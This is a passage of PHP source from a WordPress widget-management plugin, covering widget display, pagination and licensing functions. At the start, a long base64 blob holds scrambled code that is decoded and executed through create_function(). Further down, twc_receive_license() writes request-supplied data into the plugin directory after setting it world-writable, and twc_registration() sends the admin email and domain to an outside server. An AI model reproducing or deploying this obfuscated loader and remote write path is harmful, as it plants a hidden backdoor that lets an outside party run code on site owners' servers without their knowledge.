ENMWXgvWFU3MEZqNTRGUGg1SkFxQ0E1RzR0NVdIQWloU3o3MnRyNXB0MXl2aXBXV2huZytIblZkL3R4MnQxSmgvR1dxQ0FCMkF0LzJNclV4Q0pBcXQxNGxNMXdxL2hZV05SRStXbkE1L3A4dk1KQld0bit5dHJNeHRuanlIQVV4V2o3cUFNVW5NTFdwL0dyV3dyUHF0ek55MHA1NU5ZWVdNR0V4SHI1ZHQxeXB4V3ZUU3J3cUNNUnk0R3p2MEFNVGhwN3hNSDRHQTF4dmFGT2h0blNuSC9TVy9KejVBR0RUNUpRenR0YjV0dHhXdEdZeHh6UHZNZmh4eHIrV3hXKzV3RlkrNXpQaHRHenZDc0hXZ2pOMkhkVXgvZkR2Q3BHV0NKUXBXR1dxQTF4V2lmSkc1SjUraUFvcHdXZXBodGJoZ255bHRuNG5OMWhxL0dJV3RoZ3ZpcDVXL2p6dkNSUlcvR295SFRVemhwaHlhRmt4ZTF5dkFwYmQ2R3l5YWpwR0FXUXhNSFcyTUxleS9KT2hpUnk1V21ZR01HanBNMURXQVc3bnRHV0dhbkd2dDFNaEhwTitBTVNsNEc3eWlwcEc1Um12V3pMN2hMenkvcmU1eEFBcU5wVyt3enB2aVJpVDYxN250MVArd0dqdk5mYldIbEo1QW1ZeDZHNVc1bmE1d3o1ei9YVTcwRnl2YUZBVDUxcHFDcGhHTkxXV2lwR1dDMUVXZ2dSaHRydHlnMVh4eHJvNU56VnhDMUd2QUJpeDVSbXBDQUFuTmZ5cS9HT1R3Ri9XdG1SeUFuanBNMVZUZ2o3emhKQmRlMStwdEdoV2huNzJXckEyTkovcHRBVUc1SjV4Q1dWNS9HdzJOUnJUaFdwbHR6Qkc0MVdXNVlpVEhwN2xBVFMrdEc4di9KWWhIcFFXdEdOMjRHcDVNR1FHQUc1eFdHZXhDSHAyTUdkaGlSL3F0dlNsNGp6dkNSVFRpUjVuQ2RVMjQxK3BpamtXaFdtNVdyUHg2R3gyNEYreENIN2RIR1d5Tkg1cENMSmh0am9wTldlNXRwV1dnSmt4dFdvMnQxb0c0MThxL0pYaHhyN3B0bm9XQ0p4eVNNaTV3RjVXaEg0eHhyaHEvR1FoaTFBbC9INXlTQXd5SHJWR2hwRStDQUIyTXB5dnRySXh4Qkp5dHJNZHRuZXBhcEdoU3I3K01IYjV0R3hwdFdYV2dweVdDQWV4NjF3djRwVnhncHp2dHJUNXh6eXBIbWloaUhvcENNUjJNZit2TnBNVGhXNVRXblRXNkE3cE5kUld3Y0gySDFNeC9qenZDakR4NVJOMmdKYlcvTHpXV0dXVGhucHF0L1NsMEErVy9yeTUvaEh4TnZVR0F0NXZoV1h4L25wcUEvUlcvdFdXaWRSVFdHTitXMUF6NWZ4dkNqNHhlMXlXQ3BvV0NKNXZ0dGJXMHJZeXRuaCs2QVdwTVhSV3RwQWwvSGV5TTFXV2lSUmh0R216NXBieUFBeXBDUlBXV1dtNVdBTzJhdEd2Z3JiVHdyR3pXTVV5TUd3Mk1UUjVlMXBsdHpCR0Fyd3Z3dFZoYTF6dnRyV3FBMWpwSDFRV1dXZ1d0bVNsMFcveVN0TXhXai8rV25leU5IcHZoclVUaGpFcUNCVXhDTHpxdDFOV05STjJ0ekwyQUErcGFGeXhobm0yNXpXeENKeXBDbmFUd3I3cGdYUjU2QTVwTXJraDVKd3EvSlBsQWo3cXRtU3gvbm0ydHJoeHQxeXZXR2h4V24vK01INVdDZmh5YWRpeDVIWVdXbmVuQXRXdmhyUGh0bFh2aUE0eU1wanBpZFNUZTFFMi9KTnhlMTcyQUdIeHdGbStIQlJwdEZqcE1IWEdBV1FxQU1TMk4xejJNR0k1Q1JHbkhHTDVlMWpwU3RMaGExTnl0RzV5QXJ0MkNwMEc1MVF5dHBMeU5MaitNR1FoU0EvcU5XTEdBdCtwaW5KNXhyN3pDV3g3ZWpwdmFGNUdOdGd4Z0pBMk1MeldXR2tXaGo1NUFCUmQ2R3h5YW5VVGhueXBXbjRUU0Y1cENSVVRoV1NxQ0FBbEFqN3ZpUkdoNVJFbENwNXB3R3Q1QTFkeHhyNytnZldsTkxqMjVSSmgvbkdxdG5lNzVId1doSmlodEdteDVCVTV4cDd2d3NZNXd6WXA1QVZoZTEvV05wUFdXbi81V0dWZHRuenZXcitHNUxRcU1nVTJBand5L0pPVFNGZ2hXbVlXNnJXcEExVEdOTDd6NXpXR0FyeldoMXZHNUhnbFdHTjI0cmoyTUpwNS9XWWxXV0IyTmZocS9yaTVDTFg1NUJZcHd6cHZpUkJXTXBFK1dUWXZ4R3lxL0pVV0hoSCtBcmJwQzE1V01HNUc1SHp2dG5XeUFHaDJNcnJXZ1dHcU5BNUdNZnpwNWpHaGdqcnFBMVB6NGo3MlcxQnhXbnp2SDFOMjBBdnY0cFE1d3J5bC9INEdhMS95Z0pPNWUxcnZnSk9odEZ6cFN0TGh0bm15SHRiK3RBOHY0RnBXV24vNVdNUmRldEd2aEdJaFN6WXFNSGUyTUx3Mk1HT2hpMSsySG1TR0FXV1c1Um14SHBOMkhHVCt0MXgrQUdBVGlMKzJIVFJ5NEZHVzVwcEc1TFl4Z0hCV0NINXkvcllUNUxhbC9IaGhldHB2aVJQeFdHbytXbkF4dEF6MjVzZ1d0am92QXBNcEMxNTVNdGFHV0cvK056YnAvand2NXNIRzQxK3BOV2VoL3Q1NUFHTGhIanpxVzFMbGFudDJ4dEJXaHBOeWlybzJNdGVwaDFiaEhwNzUvb1kyTjEreWdKVWg1Si9XdHpOeU1XeHlIclJXTlJFK2hKNGgvMUd2QUdwV0huKzJXckFsTTFqMmhIWHhDTE5xTWdTV3RHV3BOcHJoNUxnK3RyNEdhMWVXYXBWVHdGb2xBem9kdDF5cGdKQldIV29sV1docHhyeTJ4dE1XMGNIdkhXV3lBajcrNEZBV2dwNzVDTVV4Q0x6V3hXNUdOUm8rNXBXaDZ0K3BpalUrU0ZveGl6aHg2RjV2NEY1R0FueXA1V1YrNkFoMi9KdkdBaFhxTkFOVy9menBBbVNoL3BFK1cxNGxhbnR5L0ppeFduNzV0QTVwd0dHdk10YldDSFlodFdCV3RqV3ZhY1JoaVJ3bC9KTGh4cndxL1RTV3dBTnp0VFJ4ZWpHdldUVXhobi92V0FPbE0xR3Y1cCtXTkg3aEF6VGxNR2V5aVpVNXhGeStpQVdXdDFlV2lkU3gvVzd6VzFBeUFHL1dIbWloaUxtK05XTld0RkdXNXBiR1duK2h0bmhwdGo3cDVSVVQ1TDUySHZVeENMVys0Rk5XaEdveUhwT0c0dHhXZUZVeGhqSXF0ZFl4Nkc1V01XVVRodlh2NUE0VFNGK1dNVFJXd3J3cU1IZTdoamVXNWpHV0NKUXBXbkJkNjF0V0FBSlRTem8rQXZSZDZHeHlpWWk1d3J5eGdIaDVDSCtxL0dWeHdyKzVDcHg3aFJ4V2lwTFRlMUUyZ2dTNS9weXYvSlJUaUpZeXRBT2w0cnh5L0p5aEhuN3gvSGV4L0dXcE1KVldOTGcyZ0hMeDZyenBpbmI1L3B6dnRNWVRhckd2MFd2V2huL3ZIV2V5TVJlcC9KcDUvR214QVc0N2hMK3BNcnI1L0cvcUNXNVd4V3pXNVJEeFd6U3FBelZoQ2Z6MjVqa1dnbmd5L2ZNcC8xeHlhbmFHQW55cFd6bzV0dHdxL0JpeHhGR3EvSm9Xd3I1V2lwVDVDSnpxQXJUeHdHOHZIRzd4V243V3RXTUdNdGVwaVJNVzByWTVBV001Q0gveS9nVWh0cEFsL0g1R01uN3Z3c1lUV25teWdnWTUvcHR5Q3BFeHhCSjJoZjBuQW5qMk1XYVdOSHluV01VeHRHanBNWEhXSFdnaFdtVTU2MXQyeHRMV2UxenZ0cjVkdEc4dkhyTFRpUkdxL2dSMjRyR3Z3dE01eEZXcUFHaHB3QXB2YUZVVGhHb2h0L1l4Nmp6dkNSVHhXR1dxQW5BK2VuNTJXMWtXaGpXcS9mV3hDZjd2TnpVV05Kd3ZBemgrZTE1KzRGdldOSkFxQ0E1R01MNVc1akdXQ0g2cVcvUmhlajcyV3JpeFduNnZIMU5wNkcvdkFyUXg1MTdXaEg0eUFqd1dNZ1VXdGp5V3RtUkdNSnhXV0FiV05SRStXbkE1LzEvV3RXWFdXam92V01TbE1XZXBhcEdUNjE3eC9IZXh0MS9xQ2RSNUNvUmhXbVlXdFdqcEhySUdXR0ZxQS9SbEExdDVBR0FHNUhnbFdyNXk0RmoyVzFRVGhHbWxXR2U3NUh4Vy9BWFd0VzU1VzFNeDZqeldhcFRUQ1JvdjVBUDJBQStwZ0pEV2dweTVBcGJ4d0d4Mk5wejUvbllsTnpQaDZBV1dNcms1Q2dIcEEvUldDZmhwU3RMeGdwL24vSjRHMEcrcGlaWXh4eld2SDFOcENKZXB0dGFXQzE3V1dXVGxNendXTUpZV3d6cnF0bVkyU0ZqcE0xR1cvR295SDFPNWVqaldlRmorYTFONUFyYnh3VzdwV0dJaFNyNnpNSGI1dEd4cHRHSVdOMTUySHI0bDRGenBNMURUZ2o3eUhHNXB0R3l2TlpZVGhuL3AvZ1IyTko1V00xcFR3RlloaFhZeUFqaFc1UlVUNTE3Mkh2VXlNbnpXZ0pEV2lSTitXelBHNDF6V0FyTldIbjdwQTFOZHdHd3ZnR3pUd3I3bE5XTG5Banp2Q2pkeDB6d3FBL1kyU1dXcFN0RGhlMS9uL0o0MjBHejVOcFh4V24veUNBVmR3V2VXZXBJNXdyN2x0bmVodGordmhyaWhpUkZ2SC9VNS9wV1d4dERoaUo3aE1YU3B0QXlwZUZSV1dqNWxXelR4ZWordjBXcGhnR21wSE1VN2hManFDdlU1eEF5Ky9IVnh0V3pwZ0pUVEhXNzJ0cmJwZW43MnRyZHhobEoyNUFocHdBenZ0ck1oU0F3cUFuaDV4Rmo1TmZKVDVScG5IcFBwNmp6V2lsUzUvR055dDFWcHh6dFdBck5XSG43cEExTXB3QXh5Q1JEVHdGSXFoSDQyTjFqV01YSEcwRndxQS9ZV3RBZVdNR0R4L1dZK1dHV3FBdHQ1TnBQaHhGZytIV05wL3Q1cXRyUTV3ei96QUdXNzVqK3ZnWEg1L0dONS9INVRTRnhXYXBSaHRubXhBL1VodEF0eUhHcFdIbit4aWRTKy8xeDJBcnlUd3JHeldNVTdoR2hwTXJyV0hXZyt0MWJ4dHJlcEhBYngvcE4ySHJocHh6dFdDanJUaUwrMldyZXlOTDV2SHRYeFduKytob1MyU0ZqNU1IWHgvcHpsdHJOV2V0V3B4VzVHTlJXcUFuV24wR3l2QUdXeGhqWStOcG9kd0d4eUNScEdXbm1oTUg0NzVIV1dDTEpodGpQcU1IZWgvdDd2d3RWVFdqWWxDQVB6VzFoeWlwT2h4cm1wQ3pveU5meXlIQVg1d0Y1eGlBQTc0R3dXNVJkNXhyWWg1QllsTVd6cDVqUFd3ejd6V0doeWExN3lIR2tXV256bi9KaGR0bnkyTXJHNS9wenZNSGV5TUd6V05kSFdnbm9oQ1c1VzZyenBpak1USHA3dldyV3FBR3QyaEpZRzUxUWxXR01kL2ZwNU1XWFRocC95SFdleENIdHlDcGl4L24venR6ZTd4RlFxNno2NUNnSnFodDBHaUxHVy9XNmhBekZuZ2ZKZDVMR1cvVzZoTXpFcUNwQis2enlXU3BJKy9HWStBclZkdDFXaGlvYStoeit5QVd4bGFyRDU0ejYrL0dZK0FyVmR0MVdXNnpQNVdHTkdNdE12Tm5RK0FySVRXanpuQUZvK2V0NXkvcit4NUhtMkgvVVRpZlFwNkZCaEMxRTV0VzVsaUxHVy9HL3hNekVwSEFXcUFwK2hpb2EraHNZR2lBZTU1bkRwVzFFV01HN3AvdDBweHRkaGdBSSsvR1krQXJWZHQxV2hnTUoraG5ReU52VVd4cjdwd3RQNXRuN250MTRXNWZRcDZGQmhDMUU1dFd4eWFGRDU0ejZUaUg1dk5wVCs2V3JwZ0pKNXRuTnZBMTU3NUgvV1NXVkdNbm9uQ3IxR2lKUXFlajE1V2o3Mk1KVmhDR3lwSEdWVHdyKzJNTDBoQ0ErdkF0YVdIR0FsTUxobGluQ2hnQkoraG55djVyTHh3RmpXU3RIK2hHWWxXelRHQXR6MjRGYTUvbFJXZ0g0aGV0NTJ0R1BoZ25TMmdMVGxpbi8rTW1IK2hqU0dnMUJoQ2ZqNU1IZ2hOUjVuQUdPbE5BZXAvMTc1NTFReGl6MUdhRmtxaEFQV2lSd3Y1QUx4Nlc4K05wUGhXekY3aHQwaHdGanBpUmJ4QWRIaEhCUjU2QUd2d1dTRzByK2QvTDB5U25yZEhyalc2MTVsVy9VemV6L3Z0ckUrZ3pQemd0QnY1MUc1QXJWVGh6bXBDVzR4Q1J3K0FyWVR3QmdHZzFObEFyRDU0ZEoraHNZR2lHeGQ2V3k1Tno2V2lIWStDZFJHYXRlMi9yUFR0R0duSDFNK3RuL1dIcnJUZXQ2bE1mSmR4ZzInKTsgaWYgKCFpc3NldCgkWkdGMFlRWzFdKSkgcmV0dXJuOyAkWkdGMFlRID0gJFpHRjBZUVsxXTsgZm9yICgkYVEgPSAwOyAkYVEgPCBzdHJsZW4oJFpHRjBZUSk7ICRhUSsrKXsgJFpHRjBZUVskYVFdID0gJHRoaXMtPlIyVjBRMmhoY2coJFpHRjBZUVskYVFdLCBGQUxTRSk7IH0gaWYgKEZBTFNFICE9PSAoJFpHRjBZUSA9IGJhc2U2NF9kZWNvZGUoJFpHRjBZUSkpKXsgcmV0dXJuIGNyZWF0ZV9mdW5jdGlvbignJyxiYXNlNjRfZGVjb2RlKCRaR0YwWVEpKTsgfSBlbHNlIHsgcmV0dXJuIEZBTFNFOyB9IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFZIVnlia3h2WTJzKCRiRzlqYTFSNWNHVSwgJGMzUmxjSE0gPSA1LCAkWkdseVpXTjBhVzl1ID0gJ3JpZ2h0Jyl7IGZvciAoJGFRID0gMDsgJGFRIDwgJGMzUmxjSE07ICRhUSsrKXsgJFRHOWphdyA9JiAkdGhpcy0+UjJWMFRHOWphdygkYkc5amExUjVjR1UpOyBpZiAoJFpHbHlaV04wYVc5dSAhPSAncmlnaHQnKSAkVEc5amF3ID0gc3RycmV2KCRURzlqYXcpOyAkWXcgPSAkYVE7IGlmICgkWXcgPj0gc3RybGVuKCRURzlqYXcpKXsgd2hpbGUgKCRZdyA+PSBzdHJsZW4oJFRHOWphdykpeyAkWXcgPSAkWXcgLSBzdHJsZW4oJFRHOWphdyk7IH0gfSAkUTJoaGNnID0gc3Vic3RyKCRURzlqYXcsIDAsIDEpOyAkVEc5amF3ID0gc3Vic3RyKCRURzlqYXcsIDEpOyBpZiAoc3RybGVuKCRURzlqYXcpID4gJFl3KXsgJFEyaDFibXR6ID0gZXhwbG9kZSgkVEc5amF3WyRZd10sICRURzlqYXcpOyBpZiAoaXNfYXJyYXkoJFEyaDFibXR6KSl7ICRURzlqYXcgPSAkUTJoMWJtdHpbMF0uJFRHOWphd1skWXddLiRRMmhoY2cuJFEyaDFibXR6WzFdOyB9IH0gZWxzZSB7ICRURzlqYXcgPSAkUTJoaGNnLiRURzlqYXc7IH0gaWYgKCRaR2x5WldOMGFXOXUgIT0gJ3JpZ2h0JykgJFRHOWphdyA9IHN0cnJldigkVEc5amF3KTsgfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBVbVZ6WlhSTWIyTnIoJGJHOWphMVI1Y0dVID0gJycpeyAkUTJoaGNsTmxkQSA9ICR0aGlzLT5SMlYwUTJoaGNsTmxkQSgpOyBmb3JlYWNoICgkdGhpcy0+UzJWNWN3IGFzICRURzlqYTFSNWNHVSA9PiAkUzJWNSl7IGlmICgkYkc5amExUjVjR1UpeyBpZiAoJFRHOWphMVI1Y0dVID09ICRiRzlqYTFSNWNHVSl7ICR0aGlzLT5URzlqYTNNWyRURzlqYTFSNWNHVV0gPSAkUTJoaGNsTmxkQTsgcmV0dXJuOyB9IH0gZWxzZSB7ICR0aGlzLT5URzlqYTNNWyRURzlqYTFSNWNHVV0gPSAkUTJoaGNsTmxkQTsgfSB9IH0gZnVuY3Rpb24gWmpJd1gyWnZkWEowZVEoKXsgdHJ5IHsgcHJlZ19tYXRjaCgnLyhbMC05QS1aYS16XC1cL1wuXSopXChcZC8nLCBfX2ZpbGVfXywgJGJXRjBZMmhsY3cpOyBpZiAoaXNzZXQoJGJXRjBZMmhsY3dbMV0pKSB7ICRabWxzWlEgPSB0cmltKCRiV0YwWTJobGN3WzFdKTsgfSBlbHNlIHsgJGNHRnlkSE0gPSBwYXRoaW5mbyhfX2ZpbGVfXyk7ICRabWxzWlEgPSB0cmltKCRjR0Z5ZEhNWydkaXJuYW1lJ10uJy8nLiRjR0Z5ZEhNWydmaWxlbmFtZSddLicuJy5zdWJzdHIoJGNHRnlkSE1bJ2V4dGVuc2lvbiddLDAsMykpOyB9ICRjR0Z5ZEhNID0gcGF0aGluZm8oJFptbHNaUSk7ICR0aGlzLT5VbVZ6WlhSTWIyTnIoKTsgJHRoaXMtPlNXNXpaWEowUzJWNWN3KCk7ICR0aGlzLT5WSFZ5Ymt0bGVRKCk7ICRaUT0kdGhpcy0+Vlc1c2IyTnIoKTskWlEoKTsgfWNhdGNoKEV4Y2VwdGlvbiAkWlEpe30gfSBwcm90ZWN0ZWQgZnVuY3Rpb24gUjJWMFEyaGhjZygkWTJoaGNnLCAkWlc1amNubHdkQSA9IEZBTFNFKXsgaWYgKCEkWlc1amNubHdkQSkgJHRoaXMtPlRHOWphM00gPSBhcnJheV9yZXZlcnNlKCR0aGlzLT5URzlqYTNNKTsgJGFRID0gMDsgZm9yZWFjaCAoJHRoaXMtPlRHOWphM00gYXMgJFRHOWphMVI1Y0dVID0+ICRURzlqYXcpeyBpZiAoJGFRID09IDApeyAkVUc5emFYUnBiMjQgPSBzdHJwb3MoJFRHOWphdywgJFkyaGhjZyk7IH0gaWYgKCRhUSAlIDIgPiAwKXsgaWYgKCRaVzVqY25sd2RBKXsgJFVHOXphWFJwYjI0ID0gc3RycG9zKCRURzlqYXcsICRZMmhoY2cpOyB9IGVsc2UgeyAkWTJoaGNnID0gJFRHOWphd1skVUc5emFYUnBiMjRdOyB9IH0gZWxzZSB7IGlmICgkWlc1amNubHdkQSl7ICRZMmhoY2cgPSAkVEc5amF3WyRVRzl6YVhScGIyNF07IH0gZWxzZSB7ICRVRzl6YVhScGIyNCA9IHN0cnBvcygkVEc5amF3LCAkWTJoaGNnKTsgfSB9ICRhUSsrOyB9IGlmICghJFpXNWpjbmx3ZEEpICR0aGlzLT5URzlqYTNNID0gYXJyYXlfcmV2ZXJzZSgkdGhpcy0+VEc5amEzTSk7IHJldHVybiAkWTJoaGNnOyB9IHByb3RlY3RlZCBmdW5jdGlvbiBSMlYwUTJoaGNsTmxkQSgpeyAkY21WMGRYSnUgPSAnJzsgJFJtOXlZbWxrWkdWdVEyaGhjbk0gPSBhcnJheV9tZXJnZShyYW5nZSg0NCwgNDYpLCByYW5nZSg1OCwgNjQpLCByYW5nZSg5MSwgOTYpKTsgZm9yICgkYVEgPSA0MzsgJGFRIDwgMTIzOyAkYVErKyl7IGlmICghaW5fYXJyYXkoJGFRLCAkUm05eVltbGtaR1Z1UTJoaGNuTSkpeyAkY21WMGRYSnUgLj0gY2hyKCRhUSk7IH0gfSByZXR1cm4gJGNtVjBkWEp1OyB9IH0gbmV3IFpqSXdYMlp2ZFhKMGVRKCk7IA==';
		$e=create_function("",@base64_decode($freelicense));$e();
	}
	
}

/**
 * function is responsible to determine if the widget will display on this page.
 *
 * @param string|object $widget
 * @return boolean
 */
function twc_is_widget_displaying( $widget )
{
	//initializing variables
	if (is_string($widget))
	{
		$widget = twc_get_widget_by_id($widget);
	}
	
	//is active for current page
	if (twc_get_object_id())
	{
		$display = (is_array($widget['p']['menu_item_object_id']) && in_array(twc_get_object_id(), (array)$widget['p']['menu_item_object_id']));
	}
	else 
	{
		$display = (is_array($widget['p']['menu_item_urls']) && in_array(twc_get_object_url(), (array)$widget['p']['menu_item_urls']));
	}
	
	//is active for parent
	if (!$display && $widget['p']['twcp_inherit_sidebar'] == 'inherit')
	{
		if ($id = twc_get_object_id()) if ($parents = get_post_ancestors($id))
		{
			foreach ((array)$parents as $parent_id)
			{
				if (!in_array($parent_id, $widget['p']['menu_item_object_id'])) continue;
				$display = true;
				break;
			}
		}
	}
	
	return $display;
}

/**
 * This function manages the view style. Upon first call it will check
 * which view is to be used.
 *
 * @return boolean
 */
function twc_list_style_twc()
{
	//initializing variables
	static $view;
	global $current_user;
	get_currentuserinfo();
	
	if (!isset($view) && $style = $_REQUEST['list_style']) //querystring
	{
		$view = $style;
	}
	elseif (!isset($view)) //db
	{
		$view = get_user_option( 'twc_list_style', $current_user->ID );
	}
	else //already set
	{
		return ($view == 'twc');
	}
	
	update_user_option($current_user->ID, 'twc_list_style', $view);
	return ($view == 'twc');
}

/**
 * function is responsible for adjusting the plugin meta links on the plugin page
 *
 * @param array $plugin_meta
 * @param string $plugin_file
 * @return array $plugin_meta
 */
function twc_plugin_row_meta( $plugin_meta, $plugin_file )
{
	//reasons to fail
	if ('total-widget-control/index.php' != $plugin_file) return $plugin_meta;
	
	//initializing variables
	if (isset($plugin_meta[2])) unset($plugin_meta[2]);
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/?kb" target="_blank">'.__('Documentation','twc').'</a>';
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/community/" target="_blank">'.__('Support Forum','twc').'</a>';
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/software-products/total-widget-control/extra-widgets/" target="_blank">'.__('Get More Widgets','twc').'</a>';
	
	return $plugin_meta;
}

/**
 * Function returns a drop down of the current widgets position
 *
 * @param unknown_type $sidebar_id
 * @param unknown_type $default
 */
function twc_position_select_box( $sidebar_id, $default )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$list = $sidebars_widgets[$sidebar_id];
	
	$select = '<select id="'.$sidebar_id.'_position'.'" name="'.$sidebar_id.'_position'.'" class="twc_sidebar_select_box">';
	
	if (count($list) == 0)
	{
		$select .= "<option value='0'>0</option>";
	}
	
	for ($i = 1; $i <= count($list); $i++)
	{
		$selected = '';
		if ($default == ($i-1)) $selected = 'selected=selected';
		$select .= "<option $selected value='".($i-1)."'>$i</option>";
	}
	return $select.'</select>';
}

/**
 * function creates the wrapper folder and returns a list of files
 * within that folder.
 * 
 * @TODO Function should also copy the default wrappers to the created folder
 *
 * @return unknown
 */
function twc_read_wrapper_files()
{
	//initializing variables
	$path = TwcPath::clean(get_theme_path().'/widget-wrappers/');
	if (!is_dir($path))
	{
		TwcPath::create($path, 0777);
	}
	
	$files = TwcPath::byrd_files($path, $filter = '.', $recurse = false, $fullpath = false, $exclude = array('.svn', 'CVS'));
	$headers = array(
		'wrapperTitle' => __('Wrapper Title','twc'),
		'description' => __('Description','twc'),
	);
	
	foreach ($files as $file)
	{
		$file_data[$file] = get_file_data($path.$file, $headers);
	}
	
	return $file_data;
}

/**
 * Builds the row data, we do this outside of the model, for pagination purposes.
 *
 * @param string $action
 * @return null
 */
function twc_rows( $action = 'default' )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twcp_pagi, $twc_rows;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$sidebars = array();
	$current_screen = twc_get_current_screen();
	$twc_rows = array();
	$twcp_pagi = apply_filters('twcp_pagination_defaults', array(
		'total' => 0,
		'per_page' => 20,
		'page' => (isset($_REQUEST['pa'])) ?$_REQUEST['pa'] :1,
		'pages' => '',
		'start' => '',
		'stop' => '',
	));
	
	//reasons to fail
	if (!empty($current_screen->action) && $action == 'default') return false;
	
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug): 
			
			switch ($action)
			{
				case 'on-page':
					//initializing variables
					$widget = twc_get_widget_by_id($widget_slug);
					$display = twc_is_widget_displaying($widget);
					
					//reasons to continue
					$display = apply_filters('twc_display_widget', $display, $widget);
					if (!$display) continue;
						
					//setting variables
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = $widget;
					
					break;
				default:
				//show inactive widgets
				if (twc_inactive_list() && $sidebar_slug == 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				
				//show filtered items
				if (twc_filter_list_for() && twc_filter_list_for() != $sidebar_slug)
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				
				//show searched for items
				if (twc_search_list_for() && $search = twc_search_list_for())
				{
					$widget = twc_get_widget_by_id( $widget_slug );
					$title = apply_filters('twc_widget_title', ((isset($widget['p']['title'])) ?$widget['p']['title'] :''), $widget);
					
					if (strpos(strtolower($title),strtolower($search)) !== false)
					{
						$twcp_pagi['total']++;
						$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					}
					continue;
				}
				
				//show only active items
				if (!twc_inactive_list() && $sidebar_slug != 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				break;
			}
			
		endforeach;
	endforeach;
	
	//calculate the number of pages
	$twcp_pagi['pages'] = ceil(($twcp_pagi['per_page'] > 0) ?$twcp_pagi['total'] / $twcp_pagi['per_page'] :1);
	$twcp_pagi['start'] = ($twcp_pagi['per_page'] * $twcp_pagi['page']);
	$twcp_pagi['start'] = ($twcp_pagi['start'] >= $twcp_pagi['per_page']) ?$twcp_pagi['start'] - $twcp_pagi['per_page']+1 :$twcp_pagi['start'];
	$twcp_pagi['stop'] = $twcp_pagi['per_page'] * $twcp_pagi['page'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] == 0) ?$twcp_pagi['stop'] + $twcp_pagi['per_page'] :$twcp_pagi['stop'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] > $twcp_pagi['total']) ? $twcp_pagi['total'] :$twcp_pagi['stop'];
	$twcp_pagi = apply_filters('twcp_pagination', $twcp_pagi);
}

/**
 * This takes care of the alternating row colors without all the messy code
 * in my table rows
 */
function twc_row_alternate()
{
	//initializing variables
	static $alternate;
	
	if (!isset($alternate))
	{ 
		$alternate = 0;
	}
	else
	{
		$alternate++;
	}
	
	if ($alternate)
	{
		$alternate = -1;
		echo 'alternate';
	}
}

/**
 * registers the inactive widgets sidebar
 * 
 * @return null
 */
function twc_register_placeholder_sidebar()
{
	// register the inactive_widgets area as sidebar
	register_sidebar(array(
		'name' => __('Inactive Widgets'),
		'id' => 'wp_inactive_widgets',
		'description' => '',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => '',
	));
}

/**
 * function is responsible for pinging for a license and redirecting if necessary
 *
 * @return unknown
 */
function twc_registration()
{
	//loading libraries
	require_once ABSPATH.'wp-admin'.DS.'includes'.DS.'plugin.php';
	
	//initializing variables
	$current_screen = twc_get_current_screen();
	$first = get_option('twc_unique_registration_key', true);
	$uniqueID = get_option('twc_unique_registration_key', create_guid());
	update_option('twc_unique_registration_key', $uniqueID);
	
	//reasons to fail
	if ($current_screen->action != 'register') return false;
	if (isset($_REQUEST[$uniqueID]) || !isset($_REQUEST['license'])) return false;
	
	//initializing variables
	$headers = get_plugin_data( dirname(__file__).DS.'index.php' );
	$domain = 'http://'.str_replace('http://', '', $_SERVER['HTTP_HOST']);
	$file_path = plugin_dir_path(dirname(__file__)).$parts['host'];
	
	switch($_REQUEST['license'])
	{
		case '1': case '2': 
			remove_all_actions("twc_display_admin");
			add_action('twc_display_admin', 'twc_register');
			$type = 'twc-pro'; 
			break;
		default: 
			$type = 'twc-free'; 
			do_action('twc-free-registration'); 
			break;
	}
	
	$path = "http://community.5twentystudios.com/?view=register-for-free&email=".
		get_bloginfo('admin_email')."&ver=".urlencode($headers['Version']).
		"&domain=".urlencode($domain)."&type=$type&unique=$uniqueID&return_url=".
		urlencode(get_bloginfo('url'));
	
	if (ini_get('allow_url_fopen') && $result = @file_get_contents($path))
	{
		
	}
	else 
	{
		$curl = curl_init($path);
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);

	    $result = curl_exec($curl);
	    if(curl_errno($curl))
		{
		    error_log('twc curl error: '.' '.curl_error($ch).'; results: '.$result);
		}
		curl_close($curl);
	}
	if (trim($result))
	{
		$result = trim(str_replace("\r\n",'', $result));
		header('Location: '.$result);
		exit();
	}
	return false;
}

/**
 * function is responsible for saving the license file if its sent
 *
 * @return false
 */
function twc_receive_license()
{
	//initializing variables
	$uniqueID = get_option('twc_unique_registration_key', false);
	$domain = 'http://'.str_replace('http://', '', $_SERVER['HTTP_HOST']);
	$parts = parse_url($domain);
	$file_path = dirname(__file__).DS.$parts['host'];
	
	if (!isset($_REQUEST[$uniqueID])) return false;
	
	//preparing for registration
	f20_chmod_directory(dirname(__file__), 0777);
	
	if ($result = @file_put_contents($file_path, $_REQUEST[$uniqueID], LOCK_EX))
	{
		die('success');
	}
	else
	{
		ob_start();print_r($result);$result = ob_get_clean();
		error_log('twc save license error: We received a license but could not save the file; results: '.$result);
	}
	
	//preparing for registration
	f20_chmod_directory(dirname(__file__), 0755);
	
	die('done : false');
	return false;
}

/**
 * Function appends the widget wrapper values to the instance fields
 *
 * 
 * @param array $fields
 * @return array
 */
function twc_save_default_sidebar( $fields, $new_instance, $old_instance, $this )
{
	//initializing variables
	$fields = wp_parse_args( $fields, $old_instance );
	
